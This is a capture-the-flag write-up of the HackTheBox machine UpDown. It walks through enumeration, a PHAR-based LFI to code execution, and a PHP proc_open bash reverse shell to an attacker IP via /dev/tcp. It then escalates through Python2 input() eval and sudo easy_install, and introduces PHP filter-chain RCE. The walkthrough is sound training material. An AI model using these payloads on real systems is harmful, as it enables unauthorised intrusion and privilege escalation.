---
title: HTB: UpDown
url: https://0xdf.gitlab.io/2023/01/21/htb-updown.html
date: 2023-01-21T14:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: htb-updown, hackthebox, ctf, nmap, ssrf, feroxbuster, wfuzz, subdomain, git, gitdumper, source-code, php, phar, upload, php-disable-functions, php-proc_open, python2-input, python, easy-install, htb-crimestopper, php-filter-injection, youtube, htb-crimestoppers, dfunc-bypasser, oscp-like-v3
---

![UpDown](https://0xdfimages.gitlab.io/img/updown-cover.png)

UpDown presents a website designed to check the status of other webpages. The obvious attack path is an server-side request forgery, but nothing interesting comes from it. There is a dev subdomain, and I’ll find the git repo associated with it. Using that, I’ll figure out how to bypass the Apache filtering, and find a code execution vulnerability out of an LFI using the PHP Archive (or PHAR) format. With a shell, I’ll exploit a legacy Python script using input, and then get root by abusing easy\_install.

## Box Info

| Name | [UpDown](https://hackthebox.com/machines/updown)  [UpDown](https://hackthebox.com/machines/updown) [Play on HackTheBox](https://hackthebox.com/machines/updown) |
| --- | --- |
| Release Date | [03 Sep 2022](https://twitter.com/hackthebox_eu/status/1565369009540931585) |
| Retire Date | 21 Jan 2023 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for UpDown |
| Radar Graph | Radar chart for UpDown |
| First Blood User | 00:51:34[celesian celesian](https://app.hackthebox.com/users/114435) |
| First Blood Root | 00:53:25[celesian celesian](https://app.hackthebox.com/users/114435) |
| Creator | [AB2 AB2](https://app.hackthebox.com/users/1303) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.177
Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-14 21:16 UTC
Nmap scan report for 10.10.11.177
Host is up (0.090s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.58 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.177
Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-14 21:16 UTC
Nmap scan report for 10.10.11.177
Host is up (0.094s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Is my Website up ?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.96 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu focal 20.04.

### Website - TCP 80

#### Site

The site is a simple up/down checker:

![image-20230114161833935](https://0xdfimages.gitlab.io/img/image-20230114161833935.png)

I’ll note it says `siteisup.htb` at the bottom. I’ll put my own host into the website (`http://10.10.14.6/test`), and start `nc` listening on 80. On clicking check, there’s an HTTP request:

```

oxdf@hacky$ nc -lnvp 80
Listening on 0.0.0.0 80
Connection received on 10.10.11.177 42670
GET /test HTTP/1.1
Host: 10.10.14.6
User-Agent: siteisup.htb
Accept: */*

```

Custom `User-Agent` doesn’t leak what kind of tech is being used here, and there’s nothing else too interesting.

I’ll put some text into a file, and host it:

```

oxdf@hacky$ echo "hello!" > test
oxdf@hacky$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

If I submit, there’s a successful request:

```
10.10.11.177 - - [14/Jan/2023 21:33:00] "GET /test HTTP/1.1" 200 

```

And the site reports it’s up:

![image-20230114163335051](https://0xdfimages.gitlab.io/img/image-20230114163335051.png)

It’s hard to read, but it says “is up” in green.

If I do the same thing with “Debug mode (On/Off)” checked, it looks the same from my server, but the response includes the content:

![image-20230114163429610](https://0xdfimages.gitlab.io/img/image-20230114163429610.png)

#### Tech Stack

The HTTP response headers don’t tell me much:

```

HTTP/1.1 200 OK
Date: Sat, 14 Jan 2023 21:49:31 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1131
Connection: close
Content-Type: text/html; charset=UTF-8

```

Looking at the main page file name, `index.php` returns the same page, so that’s a good indication this is all built on PHP.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```

oxdf@hacky$ feroxbuster -u http://siteisup.htb -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://siteisup.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       40l       93w     1131c http://siteisup.htb/
403      GET        9l       28w      277c http://siteisup.htb/.php
301      GET        9l       28w      310c http://siteisup.htb/dev => http://siteisup.htb/dev/
200      GET       40l       93w     1131c http://siteisup.htb/index.php
200      GET        0l        0w        0c http://siteisup.htb/dev/index.php
403      GET        9l       28w      277c http://siteisup.htb/server-status
[####################] - 1m    180000/180000  0s      found:6       errors:18     
[####################] - 1m     60000/60000   516/s   http://siteisup.htb 
[####################] - 1m     60000/60000   516/s   http://siteisup.htb/ 
[####################] - 1m     60000/60000   507/s   http://siteisup.htb/dev 

```

`/dev` is interesting. Visiting it just return an empty page.

### Subdomain Brute Force

Given the use of the domain name, I’ll fuzz for subdomains. I’ll start `wfuzz` without any filters, and note that the default response seems to be 1131 characters. I’ll ctrl-c to kill that, and add `--hh 1131`, and run again:

```

oxdf@hacky$ wfuzz -u http://10.10.11.177 -H "Host: FUZZ.siteisup.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 1131
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.177/
Total requests: 4989

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000019:   403        9 L      28 W     281 Ch      "dev"

Total time: 45.44443
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 109.7824

```

I’ll add both the domain and subdomain to my `/etc/hosts` file:

```
10.10.11.177 siteisup.htb dev.siteisup.htb

```

### dev.siteisup.htb

Visiting this just returns 403 forbidden:

![image-20230114165002047](https://0xdfimages.gitlab.io/img/image-20230114165002047.png)

## Shell as www-data

### Get Source Code

#### Identify .git Repo

This is admittedly a weakness in my methodology. There are many ways to find a `.git` folder on a webserver. `nmap` has a script that’s included in `-sC` that will find it if it’s in the web root. There are also wordlists that check specifically for `.git` when brute forcing directories (ie, `feroxbuster`, etc). Unfortunately, for me, the list I like to use there doesn’t have `.git` in it.

When there’s a `.git` directory on another subdomain from my initial `nmap` scan or in a directory, my standard methodology will miss it. I handle that by checking a bit more manually for these. Others might prefer a different wordlist. Regardless, there is one here in `/dev`:

![image-20230116071824796](https://0xdfimages.gitlab.io/img/image-20230116071824796.png)

#### Download Repository

I like [git-dumper](https://github.com/arthaud/git-dumper) for downloading `.git` repos from websites:

```

oxdf@hacky$ mkdir git
oxdf@hacky$ cd git/
oxdf@hacky$ /opt/git-dumper/git_dumper.py http://siteisup.htb/dev/.git/ .
[-] Testing http://siteisup.htb/dev/.git/HEAD [200]
[-] Testing http://siteisup.htb/dev/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://siteisup.htb/dev/.gitignore [404]
...[snip]...
[-] Fetching http://siteisup.htb/dev/.git/objects/pack/pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.pack [200]
[-] Running git checkout .
Updated 6 paths from the index

```

Sometimes it’ll crash on that last command, when it runs `git checkout .`. If that happens, I’ll run `git status` and see the issue:

```

oxdf@hacky$ git status                                                                           
fatal: detected dubious ownership in repository at '/media/sf_CTFs/hackthebox/updown-10.10.11.177/git'                                 
To add an exception for this directory, call:

        git config --global --add safe.directory /media/sf_CTFs/hackthebox/updown-10.10.11.177/git 

```

Running the command there will add the directory to a trusted one and allow me to work with it.

### Source Analysis

#### Overview

The repo provides six files (and the `.git` directory):

```

oxdf@hacky$ ls -a
.  ..  admin.php  changelog.txt  checker.php  .git  .htaccess  index.php  stylesheet.css

```

Both `admin.php` and `checker.php` return 404 Not Found on the main site and in the `/dev` folder. Anything I try on `dev.siteisup.htb` returns 403, so hard to say there. But it seems like a likely candidate since I found it in the `/dev` folder.

#### .htaccess

The `.htaccess` file is used to manage access to a page or path on a webserver by Apache. The file here is using the `Deny` and `Allow` directives to manage access to the site:

```

SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header

```

These are [super unintuitive to manage](https://stackoverflow.com/a/10078317), but unlike firewall rules, all the rules are processed, and the *last* one matching is applied. So here, first it applies the `Deny All`, which matches everything. Then it applies `Allow from env=Required-Header`. This is defined on the first line, which uses the `SetEnvIfNocase` [directive](https://httpd.apache.org/docs/2.4/mod/mod_setenvif.html#setenvifnocase) to say that if there is a header named `Special-Dev` with the value “only4dev”, then set the `Required-Header` environment variable.

Effectively, this allows only requests with that header.

#### index.php

The next `index.php` page has a link to a `admin.php`, and then also uses an `include` to load the main body of the page:

```

<b>This is only for developers</b>
<br>
<a href="?page=admin">Admin Panel</a>
<?php
	define("DIRECTACCESS",false);
	$page=$_GET['page'];
	if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){
		include($_GET['page'] . ".php");
	}else{
		include("checker.php");
	}	
?>

```

The `preg_match` is denylisting paths that might show up in a typical local file include, a common attack against this application structure. The `page` parameter has `.php` appended to it and that page is loaded and executed.

It also sets a variable, `DIRECTACCESS` to `false`. I’ll see in both `admin.php` and `checker.php` that the page will only load if this is set to `false`, preventing direct access to those pages.

#### admin.php

This page blocks access if it is accessed directly (rather than included from `index.php`):

```

<?php
if(DIRECTACCESS){
	die("Access Denied");
}

#ToDo
?>

```

Other than that, it’s still in a “to do” state.

#### checker.php

This page is very similar to the previous one, but this one has a form that takes a file labeled “List of websites to check” rather than a text field.

```

<form method="post" enctype="multipart/form-data">
			    <label>List of websites to check:</label><br><br>
				<input type="file" name="file" size="50">
				<input name="check" type="submit" value="Check">
</form>

```

If the request is a POST, it makes sure it’s not too large, and then gets the filename:

```

if($_POST['check']){
  
	# File size must be less than 10kb.
	if ($_FILES['file']['size'] > 10000) {
        die("File too large!");
    }
	$file = $_FILES['file']['name'];

```

Next it checks against a denylist of file extensions:

```

	# Check if extension is allowed.
	$ext = getExtension($file);
	if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
		die("Extension not allowed!");
	}

```

Then it creates a directory from the hash of the current time in the `uploads` directory, and moves the file into that:

```

	# Create directory to upload our file.
	$dir = "uploads/".md5(time())."/";
	if(!is_dir($dir)){
        mkdir($dir, 0770, true);
    }
  
  # Upload the file.
	$final_path = $dir.$file;
	move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");

```

It then does some stuff with the file, reading it, and checking websites. I’m going to ignore that bit for now. But I will note that at the end, it does delete the file (`unlink`):

```

  # Read the uploaded file.
        $websites = explode("\n",file_get_contents($final_path));

        foreach($websites as $site){
                echo date("Y.m.d") . "<br>";
                $site=trim($site);
                echo "testing " . $site . ".<br>";
                if(!preg_match("#file://#i",$site) && !preg_match("#data://#i",$site) && !preg_match("#ftp://#i",$site)){
                        $check=isitup($site);
                        if($check){
                                echo "<center>{$site}<br><font color='green'>is up ^_^</font></center>";
                        }else{
                                echo "<center>{$site}<br><font color='red'>seems to be down :(</font></center>";
                        }
                }else{
                        echo "<center><font color='red'>Hacking attempt was detected !</font></center>";
                }
        }

  # Delete the uploaded file.
        @unlink($final_path);
        echo "file is deleted?";
}

```

### Interacting with `dev.siteisup.htb`

#### Set Header

Base on on the source code analysis, there are a few things I can try. First, I’ll use an extension like [Modify Header Value](https://addons.mozilla.org/en-US/firefox/addon/modify-header-value/) to set a the custom header:

![image-20230117160438066](https://0xdfimages.gitlab.io/img/image-20230117160438066.png)

Now when I visit, I get the page:

![image-20230117160514847](https://0xdfimages.gitlab.io/img/image-20230117160514847.png)

It says “This is only for developers” and has a link to the “Admin Panel” at the top left. It says “(beta)” towards the bottom, and there’s a link to the changelog. Most interestingly, it now handles a file rather than a single site.

#### Upload List / Find Uploads

I’ll create a simple text file with some sites in it to check:

```

hackthebox.com
10.10.14.6
10.10.10.10

```

I don’t expect it to reach the first or third one, but I’ll start a Python webserver on mine. When I upload the file, it hangs for a bit, and then returns:

![image-20230117160808279](https://0xdfimages.gitlab.io/img/image-20230117160808279.png)

I’m not sure what the forth check is about.

`/uploads` has directory listing turned on:

![image-20230117161043815](https://0xdfimages.gitlab.io/img/image-20230117161043815.png)

But the folder is empty:

![image-20230117161425450](https://0xdfimages.gitlab.io/img/image-20230117161425450.png)

This is because of the `unlink` at the end of the file.

#### Zip Files

One more observersation - If I upload a zip file, something crashes and the file doesn’t delete itself. For example, I’ll `zip` the same `text.txt` from before:

```

oxdf@hacky$ zip text.zip test.txt 
  adding: test.txt (deflated 26%)
oxdf@hacky$ cp text.zip  text.0xdf

```

I can’t upload `.zip` files, so I’ll change the extension to `.0xdf`. I’ll upload it, and it returns immediately, showing no sites checked. But now looking in `/uploads`, the file is there:

![image-20230117161726172](https://0xdfimages.gitlab.io/img/image-20230117161726172.png)

I suspect the non-ascii text breaks the application, and it never reaches the `unlink` call. It is worth noting that a cron does clean up the directories and files in `/uploads` every five minutes.

### PHP Execution

I’m going to show the intended way to get execution here. There’s another way I’ll show in [Beyond Root](#beyond-root---lfi2rce-via-php-filters).

#### Strategy

Typically I think of needing a file to end in `.php` (or `.ph3` or another known PHP extension to get execution). I also have to get around the fact that the script is going to add `.php` to the parameter I pass in.

I’m going to abuse the [PHP Archive](https://www.php.net/manual/en/book.phar.php) or PHAR format to get execution here. This is very similar to abusing the `zip` PHP stream wrapper way back in [CrimeStoppers](/2018/06/03/htb-crimestoppers.html#webshell). The `phar://` wrapper works with the format `phar://[archive path]/[file inside the archive]`. This means I can craft a URL that points to `phar://0xdf.0xdf/info.php` (where I’ll let the site add the `.php` to the end), and that file will be run from within the archive.

#### phpinfo POC

To test this, I’ll try creating a file that just calls `phpinfo`, and call it `info.php`:

```

<?php phpinfo(); ?>

```

I’ll put it into a zip archive:

```

oxdf@hacky$ zip info.0xdf info.php 
  adding: info.php (stored 0%)
oxdf@hacky$ file info.0xdf 
info.0xdf: Zip archive data, at least v1.0 to extract

```

I can’t use `.zip` files on the site, so I’ll use `.0xdf` as something arbitrary. I’ll upload that to the site:

![image-20230117162400596](https://0xdfimages.gitlab.io/img/image-20230117162400596.png)

It tried to check `PK` (the magic bytes at the start of a zip archive), and failed. The file is in `/uploads/`:

![image-20230117162549328](https://0xdfimages.gitlab.io/img/image-20230117162549328.png)

Now on visiting `http://dev.siteisup.htb/?page=phar://uploads/828afc50efeaa61d10099d92a4f618c5/info.0xdf/info`, there’s PHP info:

![image-20230117162630422](https://0xdfimages.gitlab.io/img/image-20230117162630422.png)

That’s execution.

#### disable\_functions

From here, it’s temping to put up a web shell or PHP that generates a reverse shell, but these will fail. That’s because PHP is configured with many `disable_functions` listed:

![image-20230117162855533](https://0xdfimages.gitlab.io/img/image-20230117162855533.png)

These functions won’t work, and include most of the ones necessary to get execution. However, I could notice that `proc_open` isn’t listed.

Alternatively, there’s a tool that will check for me, `dfunc-bypasser`, available [here](https://github.com/teambi0s/dfunc-bypasser). The tool is only legacy python, so I’ll have to run `python2`.

I’ll also need to add the `only4dev` header into the requests. I’ll notice at the top that it is using `requests` to make the request. Searching for where that’s later called, I’ll find this line:

```

if(args.url):
    url = args.url
    phpinfo = requests.get(url).text

```

I’ll add the header in there:

```

if(args.url):
    url = args.url
    phpinfo = requests.get(url, headers={"Special-dev":"only4dev"}).text

```

Running this now shows that `proc_open` isn’t blocked:

```

oxdf@hacky$ python2 dfunc-bypasser.py --url http://dev.siteisup.htb/?page=phar://uploads/5e31601b65f0062e32966f2f8e94fbb0/info.0xdf/info

                                ,---,     
                                  .'  .' `\   
                                  ,---.'     \  
                                  |   |  .`\  | 
                                  :   : |  '  | 
                                  |   ' '  ;  : 
                                  '   | ;  .  | 
                                  |   | :  |  ' 
                                  '   : | /  ;  
                                  |   | '` ,/   
                                  ;   :  .'     
                                  |   ,.'       
                                  '---'         

                        authors: __c3rb3ru5__, $_SpyD3r_$

Please add the following functions in your disable_functions option: 
proc_open
If PHP-FPM is there stream_socket_sendto,stream_socket_client,fsockopen can also be used to be exploit by poisoning the request to the unix socket

```

#### proc\_open

The [PHP docs](https://www.php.net/manual/en/function.proc-open.php) for `proc_open` describe it as:

> similar to [popen()](https://www.php.net/manual/en/function.popen.php) but provides a much greater degree of control over the program execution.

Some Goolging for “proc\_open reverse shell” leads me to [this repo](https://gist.github.com/noobpk/33e4318c7533f32d6a7ce096bc0457b7#file-reverse-shell-php-L62), where `proc_open` is called on line 69:

![image-20230117164456448](https://0xdfimages.gitlab.io/img/image-20230117164456448.png)

I’ll need to set `$shell` and `$descriptospec`. `$pipes` is not necessary since I’m just going to spawn a reverse shell, not try to read / write out of the process from PHP.

My reverse shell looks like, using a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) as the payload:

```

<?php
        $descspec = array(
                0 => array("pipe", "r"),
                1 => array("pipe", "w"),
                2 => array("pipe", "w")
        );
        $cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.6/443 0>&1'";
        $proc = proc_open($cmd, $descspec, $pipes);

```

I’ll zip it:

```

oxdf@hacky$ zip rev.0xdf rev.php 
  adding: rev.php (deflated 35%)

```

And upload it. Now I trigger it just like with `phpinfo` above, getting the latest uploads directory, and visiting `/?page=phar://uploads/c96c440052e65f8e167cfe6248981ad9/rev.0xdf/rev`.

There’s a connection at my listening `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.177 60210
bash: cannot set terminal process group (907): Inappropriate ioctl for device
bash: no job control in this shell
www-data@updown:/var/www/dev$ 

```

I’ll [upgrade my shell](https://www.youtube.com/watch?v=DqE6DxqJg8Q) with `script` and `stty`:

```

www-data@updown:/var/www/dev$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@updown:/var/www/dev$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@updown:/var/www/dev$ 

```

## Shell as developer

### Enumeration

#### Web Directories

www-data’s home is `/var/www`. There are two sites set up:

```

www-data@updown:/var/www$ ls
dev  html

```

The code in `dev` matches what I pulled with git, so nothing interesting there.

The code in `html` is the main site. It’s just got a `index.php` and the `dev` folder, which just has an empty `index.php` and the `.git` folder:

```

www-data@updown:/var/www/html$ ls
dev  index.php  stylesheet.css
www-data@updown:/var/www/html$ cd dev
www-data@updown:/var/www/html/dev$ ls -la
total 12
drwxr-xr-x 3 www-data www-data 4096 Oct 20  2021 .
drwxr-xr-x 3 www-data www-data 4096 Jun 22  2022 ..
drwxr-xr-x 8 www-data www-data 4096 Oct 20  2021 .git
-rw-r--r-- 1 www-data www-data    0 Oct 20  2021 index.php

```

#### Home Directory

There’s one user on the box with a home directory in `/home`, developer:

```

www-data@updown:/home$ ls
developer

```

`user.txt` is there, but www-data can’t read it:

```

www-data@updown:/home/developer$ ls -la
total 40
drwxr-xr-x 6 developer developer 4096 Aug 30 11:24 .
drwxr-xr-x 3 root      root      4096 Jun 22  2022 ..
lrwxrwxrwx 1 root      root         9 Jul 27 14:21 .bash_history -> /dev/null
-rw-r--r-- 1 developer developer  231 Jun 22  2022 .bash_logout
-rw-r--r-- 1 developer developer 3771 Feb 25  2020 .bashrc
drwx------ 2 developer developer 4096 Aug 30 11:24 .cache
drwxrwxr-x 3 developer developer 4096 Aug  1 18:19 .local
-rw-r--r-- 1 developer developer  807 Feb 25  2020 .profile
drwx------ 2 developer developer 4096 Aug  2 09:15 .ssh
drwxr-x--- 2 developer www-data  4096 Jun 22  2022 dev
-rw-r----- 1 root      developer   33 Jan 14 21:08 user.txt

```

In the `dev` directory, there’s a Python script and an executable:

```

www-data@updown:/home/developer/dev$ ls -l
total 24
-rwsr-x--- 1 developer www-data 16928 Jun 22  2022 siteisup
-rwxr-x--- 1 developer www-data   154 Jun 22  2022 siteisup_test.py
www-data@updown:/home/developer/dev$ file siteisup
siteisup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b5bbc1de286529f5291b48db8202eefbafc92c1f, for GNU/Linux 3.2.0, not stripped

```

The SetUID bit is set on `siteisup`, meaning it will run as developer.

### siteisup Analysis

#### Python Script

The Python script is short:

```

import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
        print "Website is up"
else:
        print "Website is down"

```

The `print` calls use space in a way that show this is expecting to run with Python2. But if this is called with Python2, that `input` will be a major vulnerability.

Running it sadly doesn’t even work:

```

www-data@updown:/home/developer/dev$ python2 siteisup_test.py 
Enter URL here:http://10.10.14.6/test
Traceback (most recent call last):
  File "siteisup_test.py", line 3, in <module>
    url = input("Enter URL here:")
  File "<string>", line 1
    http://10.10.14.6/test
        ^
SyntaxError: invalid syntax

```

That’s because in Python2, `input` takes the input and passes it to `eval`, and my input isn’t valid python. I can pass it a one liner that will execute and get execution:

[![image-20230117171957540](https://0xdfimages.gitlab.io/img/image-20230117171957540.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20230117171957540.png)

#### Binary

Running the executable prints a welcome line, and then looks very similar to the python script:

```

www-data@updown:/home/developer/dev$ ./siteisup
Welcome to 'siteisup.htb' application

Enter URL here:

```

In fact, it even crashes the same:

```

Enter URL here:http://10.10.14.6/test
Traceback (most recent call last):
  File "/home/developer/dev/siteisup_test.py", line 3, in <module>
    url = input("Enter URL here:")
  File "<string>", line 1
    http://10.10.14.6/test
        ^
SyntaxError: invalid syntax

```

Running `strings` on the application shows why:

```

www-data@updown:/home/developer/dev$ strings -n 20 siteisup
/lib64/ld-linux-x86-64.so.2
_ITM_deregisterTMCloneTable
_ITM_registerTMCloneTable
Welcome to 'siteisup.htb' application
/usr/bin/python /home/developer/dev/siteisup_test.py
...[snip]...

```

It’s calling the python script from the application.

### Execution as developer

#### POC

Putting all that together, I just need to run the binary (which runs as developer) and give it the Python code to run:

```

www-data@updown:/home/developer/dev$ ./siteisup            
Welcome to 'siteisup.htb' application

Enter URL here:__import__('os').system('id')
uid=1002(developer) gid=33(www-data) groups=33(www-data)
Traceback (most recent call last):
...[snip]...

```

It worked!

#### Shell

I’ll switch out `id` for `bash`:

```

www-data@updown:/home/developer/dev$ ./siteisup
Welcome to 'siteisup.htb' application

Enter URL here:__import__('os').system('bash')
developer@updown:/home/developer/dev$ id
uid=1002(developer) gid=33(www-data) groups=33(www-data)

```

It returns a shell as developer! To be more specific, the process is running under the user developer, but the group is still www-data. This means I can’t read `user.txt`, as it’s owned by root, and in the developer group:

```

developer@updown:/home/developer$ ls -l
total 8
drwxr-x--- 2 developer www-data  4096 Jun 22  2022 dev
-rw-r----- 1 root      developer   33 Jan 14 21:08 user.txt

```

### SSH

Fortunately, in developer’s `.ssh` directory, there’s an RSA key-pair:

```

developer@updown:/home/developer/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub

```

The public key matches the `authorized_keys` file:

```

developer@updown:/home/developer/.ssh$ md5sum authorized_keys  id_rsa.pub 
4ecdaf650dc5b78cb29737291233fe99  authorized_keys
4ecdaf650dc5b78cb29737291233fe99  id_rsa.pub

```

So the private key should be good enough to get a shell as developer, and it does:

```

oxdf@hacky$ vim ~/keys/updown-developer
oxdf@hacky$ chmod 600 ~/keys/updown-developer
oxdf@hacky$ ssh -i ~/keys/updown-developer developer@siteisup.htb
...[snip]...
developer@updown:~$

```

And the user flag:

```

developer@updown:~$ cat user.txt
2e025639************************

```

## Shell as root

### Enumeration

developer is able to run `easy_install` as root without a password:

```

developer@updown:~$ sudo -l
Matching Defaults entries for developer on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install

```

### Exploit easy\_install

#### Background

`easy_install` is a now deprecated way to install packages in Python. At it’s heart, it’s running a `setup.py` script which promises to take certain actions to install the package.

#### Exploit

Since `easy_install` is effectively running a Python script, getting execution from it is trivial. There’s a [GTFObins page](https://gtfobins.github.io/gtfobins/easy_install/) for this with some copy paste to get shell, but I’ll work through it on my own to better understand it.

`easy_install` needs an argument to tell if what to install:

```

developer@updown:~$ sudo easy_install
error: No urls, filenames, or requirements specified (see --help)

```

It can take a URL (so I could host something malicious on my machine and fetch it), but it can also just take a directory. I’ll create a directory:

```

developer@updown:~$ mkdir /tmp/0xdf
developer@updown:~$ cd /tmp/0xdf
developer@updown:/tmp/0xdf$

```

The malicious script goes into `setup.py`:

```

developer@updown:/tmp/0xdf$ echo -e 'import os\n\nos.system("/bin/bash")' > setup.py
developer@updown:/tmp/0xdf$ cat setup.py 
import os

os.system("/bin/bash")

```

In this case, I’m just having it import the os module and call `os.system` to run a Bash shell.

Now I just call `easy_install` pointing to that directory:

```

developer@updown:/tmp/0xdf$ sudo easy_install /tmp/0xdf/
WARNING: The easy_install command is deprecated and will be removed in a future version.
Processing 
Writing /tmp/0xdf/setup.cfg
Running setup.py -q bdist_egg --dist-dir /tmp/0xdf/egg-dist-tmp-ObdjVa
root@updown:/tmp/0xdf# id
uid=0(root) gid=0(root) groups=0(root)

```

And read `root.txt`:

```

root@updown:~# cat root.txt
a608663c************************

```

## Beyond Root - LFI2RCE via PHP Filters

### Background

There’s a really nice method for turning an LFI into RCE using PHP filters. As far as I know, this was first posted [here](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters) and HackTricks based on [this CTF writeup from loknop](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d), and later Synacktiv published an awesome [blog post](https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html) and a [script POC](https://github.com/synacktiv/php_filter_chain_generator).

At a high level, this works by passing text into various PHP filters. PHP filters are meant to read some resource and then apply some filter to it (like base64 encode / decode or converting text format).

The author of this attack figured out how to pass even an empty string into a long chain of filters to produce any output on the page the user wants. And if this is PHP output, because it’s in an `include`, then it will be executed.

Updated to add a [video](https://www.youtube.com/watch?v=TnLELBtmZ24) I did on this technique:

### Exploit

For now, I’ll just use the [provided script](https://github.com/synacktiv/php_filter_chain_generator) (I am interested in doing a more in-depth explanation of how this works - let me know if you’re interested).

I’ll clone the repo, and run the script:

```

oxdf@hacky$ python php_filter_chain_generator.py -h                                                                                                          usage: php_filter_chain_generator.py [-h] [--chain CHAIN] [--rawbase64 RAWBASE64]

PHP filter chain generator.

options:
-h, --help            show this help message and exit
--chain CHAIN         Content you want to generate. (you will maybe need to pad with spaces for your payload to work)
--rawbase64 RAWBASE64   The base64 value you want to test, the chain will be printed as base64 by PHP, useful to debug.

```

It takes a “chain”, which is the content I want to be a part of the page. I’ll have it add some PHP that will echo a message. It generates this long output:

```

oxdf@hacky$ python php_filter_chain_generator.py --chain '<?php echo "0xdf was here"; ?>'
[+] The following gadget chain will generate the following code : <?php echo "0xdf was here"; ?> (base64 value: PD9waHAgZWNobyAiMHhkZiB3YXMgaGVyZSI7ID8+)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.